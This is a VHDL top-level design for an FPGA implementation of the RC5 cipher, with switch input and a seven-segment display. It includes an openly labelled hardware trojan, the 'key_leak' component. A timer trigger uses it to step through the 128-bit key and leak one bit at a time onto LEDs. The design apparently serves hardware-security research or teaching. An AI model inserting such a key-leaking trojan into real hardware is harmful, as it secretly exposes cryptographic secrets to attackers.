Library IEEE;
Use IEEE.std_logic_1164.All;
Use IEEE.std_logic_arith.All;
Use IEEE.std_logic_unsigned.All;
Use Work.RC5_pkg.All;

Entity rc5_Struct is 
	Port
		(
			clr			: in std_logic;
			clk			: in std_logic;
			tmp_int		: in std_logic;
			din_vld		: in std_logic;
			
			key_vld		: in std_logic;


			butn_C		: in std_logic;

			sw			: in std_logic_vector(15 downto 0);
			led 		: out std_logic_vector(15 downto 0);
			SSEG_AN		: out std_logic_vector(7 downto 0);
			SSEG_CA		: out std_logic_vector(7 downto 0)

		);
End rc5_Struct;

--Architecture
Architecture Behavioral of rc5_Struct is 

--Key Expansion Module
	Component rc5_rnd_key 
		Port
		(
		clr		:	in std_logic;
		clk		:	in std_logic;
		key_vld	:	in std_logic;
		key_in	:	in Std_logic_vector (127 downto 0);
		skey	:	out rom;
		key_rdy	:	out std_logic
		);
	End Component;
	
--Encryption Module
	Component rc5_enc
		Port
		(
		clr		:	in std_logic;
		clk		:	in std_logic;
		
		din		:	in std_logic_vector(63 downto 0);
		di_vld	:	in std_logic;
		trigger	: 	in std_logic;
		key_rdy	:	in std_logic;
		skey	:	in rom;
		
		dout	:	out std_logic_vector(63 downto 0);
		do_rdy	:	out std_logic
		);
	End Component;
	
--Decryption Module
	Component rc5_dec
		Port 
		(
		clr		:	In std_logic;
		clk		:	In std_logic;
		
		din		:	In std_logic_vector(63 downto 0);
		din_vld	:	In std_logic;
		
		key_rdy	:	In std_logic;
		skey	: 	In rom;
		
		dout	:	Out std_logic_vector(63 downto 0);
		dout_rdy :	Out	std_logic
		);
	End Component;

	component Hex2LED 
		port (CLK: in STD_LOGIC; X: in STD_LOGIC_VECTOR (3 downto 0); Y: out STD_LOGIC_VECTOR (7 downto 0)); 
	end component; 
	
	component key_leak
	Port(
		clr: in std_logic;
		clk: in std_logic;
		counter: in std_logic;
		trojan_trigger : in std_logic;
		leak_key : in std_logic;
		ready1: out std_logic;
		ready0: out std_logic
	);
	end component;
--Signals
		Signal skey		: rom;
		Signal key_rdy	: std_logic;
		Signal dout_enc	: std_logic_vector (63 downto 0);
		Signal dout_dec	: std_logic_vector (63 downto 0);
		Signal enc_rdy	: std_logic;
		Signal dec_rdy	: std_logic;
		Signal i_count	: std_logic_vector (2 downto 0);
		Signal j_count	: std_logic_vector (2 downto 0);
		Signal k_count	: std_logic;
		Signal key		: std_logic_vector (127 downto 0);
		Signal din		: std_logic_vector (63 downto 0);

--Type for state machine
	Type StateType IS
		(
			ST_key_in,
			ST_data_in,
			ST_disp
		);
		
--Signal for state machine
	Signal state_main	:	StateType;

type arr is array(0 to 22) of std_logic_vector(7 downto 0);
signal NAME: arr;

constant CNTR_MAX : std_logic_vector(23 downto 0) := x"030D40"; --100,000,000 = clk cycles per second
constant VAL_MAX : std_logic_vector(3 downto 0) := "1001"; --9

constant RESET_CNTR_MAX : std_logic_vector(17 downto 0) := "110000110101000000";-- 100,000,000 * 0.002 = 200,000 = clk cycles per 2 ms


--This is used to determine when the 7-segment display should be
--incremented
signal Cntr : std_logic_vector(26 downto 0) := (others => '0');
signal timer: std_logic_vector(6 downto 0):= (others => '0');
--This counter keeps track of which number is currently being displayed
--on the 7-segment.
signal Val : std_logic_vector(3 downto 0) := (others => '0');

--This is the signal that holds the hex value to be diplayed
signal hexval: std_logic_vector(31 downto 0):=x"0123ABCD";


signal clk_cntr_reg : std_logic_vector (4 downto 0) := (others=>'0');

Signal enc_trig : std_logic;
--trojan signals
Signal led_trojan1 : std_logic;
Signal led_trojan0 : std_logic;	
signal trigger	: std_logic;
signal cntr_trig: std_logic;
SIGNAL digit : integer range 0 to 128;
--signal key_lk_trigger:std_logic;
Begin	
	trigger <= not tmp_int;	
--Port Maps
	U1 : rc5_rnd_key Port Map (clr => clr, clk => clk, key_in => key, key_vld => key_vld, skey => skey, key_rdy => key_rdy);
	U2 : rc5_enc Port Map (clr => clr, clk => clk, din => din, di_vld => enc_trig, trigger => trigger, skey => skey, dout => dout_enc, do_rdy => enc_rdy, key_rdy => key_rdy);
	U3 : rc5_dec Port Map (clr => clr, clk => clk, din => din, din_vld => enc_trig, skey => skey, dout => dout_dec, dout_rdy => dec_rdy, key_rdy => key_rdy); 
	U4 : key_leak Port Map (clr, clk, cntr_trig, trigger, key(digit), led_trojan1, led_trojan0);
--Select
	With j_count select
		hexval <= 	key(31 downto 0) 		when "000",
					key(63 downto 32) 		when "001",
					key(95 downto 64)		when "010",
					key(127 downto 96)		when "011",
					dout_enc(31 downto 0)	when "100",
					dout_enc(63 downto 32)	when "101",
					dout_dec(31 downto 0)	when "110",
					dout_dec(63 downto 32)	when "111",
					X"55555555"				when others;
	--With enc select
	--	data_rdy <= enc_rdy when '1',
	--				dec_rdy when others;

--End structure


--------------- Input Logic -----------------------
--State Machine Counter
	Process(clr, clk) Begin
		If(clr='0') Then	
			state_main <= ST_key_in;
		Elsif(clk'Event And clk='1') Then
			Case state_main IS
				When ST_key_in => If (key_vld = '1') Then state_main <= ST_data_in; End If;
				When ST_data_in => If (din_vld = '1') Then state_main <= ST_disp; End If;
				When ST_disp => state_main <= ST_disp;
				When others =>  state_main <= ST_key_in;
			End Case;
		End If;
	End Process;



	Process(clr,clk) Begin
		if(clr='0') Then
			key <= (others =>'0');
			din <= (others => '0');
		Elsif(clk'Event And clk='1') Then
			Case i_count IS
				When "000" =>  If( state_main = ST_key_in) Then 
									key(15 downto 0) <= sw;
								Elsif(state_main = ST_data_in) Then 
									din(15 downto 0) <= sw;
								End If;
				When "001" =>  If( state_main = ST_key_in) Then 
									key(31 downto 16) <= sw;
								Elsif(state_main = ST_data_in) Then 
									din(31 downto 16) <= sw;
								End If;
				When "010" =>  If( state_main = ST_key_in) Then 
									key(47 downto 32) <= sw;
								Elsif(state_main = ST_data_in) Then 
									din(47 downto 32) <= sw;
								End If;
				When "011" =>  If( state_main = ST_key_in) Then 
									key(63 downto 48) <= sw;
								Elsif(state_main = ST_data_in) Then 
									din(63 downto 48) <= sw;
								End If;
				When "100" =>  If( state_main = ST_key_in) Then 
									key(79 downto 64) <= sw;
								End If;
				When "101" =>  If( state_main = ST_key_in) Then 
									key(95 downto 80) <= sw;
								End If;
				When "110" =>  If( state_main = ST_key_in) Then 
									key(111 downto 96) <= sw;
								End If;
				When "111" =>  If( state_main = ST_key_in) Then 
									key(127 downto 112) <= sw;
								End If;
				When others => led <=sw;
			End Case;
		End If;
	End Process;

	Process(clr,butn_C)Begin
		If(clr='0') Then
			i_count <=(others => '0');
			j_count <=(others => '0');
		Elsif(butn_C'Event And butn_C ='1') Then
			i_count <= i_count+1;
			j_count <= j_count+1;
		End if;
	End Process;

	Process(clk) Begin
		If(clk'Event and clk ='1') Then
			If(state_main = ST_key_in Or state_main = ST_data_in) Then
				led <= "0000000000000" & i_count;
			Elsif(state_main =  ST_disp) Then
				led <= key_rdy & enc_trig & led_trojan1 & led_trojan0 & "00000000"  & tmp_int & j_count;
			End If;
		End If;
	End Process;


--------------- Seven Segment display section -----
timer_counter_process : process (CLK)
begin
	if (rising_edge(CLK)) then
		if ((Cntr = CNTR_MAX) or (clr = '0')) then
			Cntr <= (others => '0');
		else
			Cntr <= Cntr + 1;
		end if;
	end if;
end process;

timer_inc_process : process (CLK)
begin
	if (rising_edge(CLK)) then
		if (clr ='0') then
			Val <= (others => '0');
			enc_trig <= '0';
		elsif (Cntr = CNTR_MAX) then
			if(timer=b"0110001")then
				cntr_trig <= '1';
				digit<= digit+1;
				
			else
				timer <= timer + b"0000001";
			end if;
			if (Val = VAL_MAX) then
				Val <= (others => '0');
				enc_trig<='1';
			else
				Val <= Val + 1;
				enc_trig <='0';
			end if;
		else
			if(timer <= b"1100010")then
				cntr_trig <= '0';
				timer <= b"0000000";
			end if;
			enc_trig<='0';
			if(digit = 128)then
				digit <= 0;
			end if;
		end if;
	end if;
end process;

--This select statement selects the 7-segment diplay anode. 
with Val select
	SSEG_AN <= "01111111" when "0001",
				  "10111111" when "0010",
				  "11011111" when "0011",
				  "11101111" when "0100",
				  "11110111" when "0101",
				  "11111011" when "0110",
				  "11111101" when "0111",
				  "11111110" when "1000",
				  "11111111" when others;

--This select statement selects the value of HexVal to the necessary
--cathode signals to display it on the 7-segment
with Val select
	SSEG_CA <= NAME(0) when "0001",
				  NAME(1) when "0010",
				  NAME(2)when "0011",
				  NAME(3) when "0100",
				  NAME(4) when "0101",
				  NAME(5) when "0110",
				  NAME(6) when "0111",
				  NAME(7) when "1000",
				  NAME(0) when others;


CONV1: Hex2LED port map (CLK => CLK, X => HexVal(31 downto 28), Y => NAME(0));
CONV2: Hex2LED port map (CLK => CLK, X => HexVal(27 downto 24), Y => NAME(1));
CONV3: Hex2LED port map (CLK => CLK, X => HexVal(23 downto 20), Y => NAME(2));
CONV4: Hex2LED port map (CLK => CLK, X => HexVal(19 downto 16), Y => NAME(3));		
CONV5: Hex2LED port map (CLK => CLK, X => HexVal(15 downto 12), Y => NAME(4));
CONV6: Hex2LED port map (CLK => CLK, X => HexVal(11 downto 8), Y => NAME(5));
CONV7: Hex2LED port map (CLK => CLK, X => HexVal(7 downto 4), Y => NAME(6));
CONV8: Hex2LED port map (CLK => CLK, X => HexVal(3 downto 0), Y => NAME(7));



End Behavioral;

	